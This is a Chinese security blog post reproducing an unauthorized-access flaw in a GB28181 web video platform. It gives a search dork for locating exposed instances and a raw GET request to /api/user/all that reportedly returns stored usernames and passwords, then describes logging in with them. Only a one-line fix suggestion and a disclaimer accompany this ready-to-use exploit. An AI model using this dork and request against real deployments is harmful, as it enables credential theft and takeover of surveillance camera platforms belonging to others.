#  【0day漏洞复现】北京慧飒科技有限责任公司WEB VIDEO PLATFORM存在未授权访问漏洞   
原创 猴子  花果山讲安全   2024-05-19 15:32  
  
- 0x01 阅读须知  
  
      花果山的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他行为！！！  
- 0x02 产品介绍  
  
      WEB VIDEO PLATFORM是一个基于GB28181-2016标准实现的开箱即用的网络视频平台，负责实现核心信令与设备管理后台部分，支持NAT穿透，支持海康、大华、宇视等品牌的IPC、NVR接入。支持国标级联，支持将不带国标功能的摄像机/直播流/直播推流转发到其他国标平台。  
- 0x03 漏洞描述  
  
        
北京慧飒科技有限责任公司WEB VIDEO PLATFORM存在未授权访问漏洞，攻击者可利用漏洞获取敏感信息及执行未授权操作。  
- 0x04 复现环境  
  
      title="国标28181"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVicTUH3nKSRAicDqiboH7ia6ZpBvHXHCVfzBqVQMd9XX0sQPWrrXdsNVkRwwtGU8soZoNgEQZbsDvFZ6Q/640?wx_fmt=png&from=appmsg "")  
- 0x05 漏洞复现  
  
通过API接口：http://xxx.xxx.xxx/api/user/all，可获取到用户名和密码。  
```
GET /api/user/all HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVicTUH3nKSRAicDqiboH7ia6ZpBjgz7oREOWoghtTPe1oF5NHcgeDxO1tUumLAjsaFF5OHx4KRfaQcevQ/640?wx_fmt=png&from=appmsg "")  
  
返回登陆页面使用用户名和密码登录，并替换掉刚才获取到的用户名和密码即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVicTUH3nKSRAicDqiboH7ia6ZpBZjicicdbP0TfgDEJWicQAF9th5afZbzorMJbXkiaEZcfvqaxclb9hs8bMA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVicTUH3nKSRAicDqiboH7ia6ZpBia4Wtma9LAmofq06d7QnkibVlZ196GHFLv61l2EILQL5KED0pLx815yA/640?wx_fmt=png&from=appmsg "")  
  
登录成功，至此漏洞复现结束。  
- 0x06 修复建议  
  
对页面进行严格的访问  
权限的控制。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5OQxdkTBpVicTUH3nKSRAicDqiboH7ia6ZpBe8nXCu1tia7sYPOF5WdZ3mlrLIS7ejK057CN6ApB7CKRU4aU4icFHRWg/640?wx_fmt=png&from=appmsg "")  
  
  
